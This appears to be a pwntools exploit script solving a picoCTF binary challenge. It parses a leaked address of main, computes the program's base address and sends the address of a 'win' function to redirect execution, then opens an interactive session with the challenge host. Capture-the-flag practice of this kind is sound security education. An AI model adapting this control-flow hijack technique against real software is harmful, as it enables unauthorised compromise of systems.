#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 54906
HOST = "rescued-float.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x00005555555553c3
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.recvuntil(b"main: ")
exe_leak = int(p.recvline()[:-1], 16)
exe.address = exe_leak - 0x133d
log.info("exe_leak: " + hex(exe_leak))
log.info("exe_base: " + hex(exe.address))
# log.info("win.info: " + hex(exe.sym.win))

p.sendlineafter(b"0x12345: ", hex(exe.sym.win))

p.interactive()
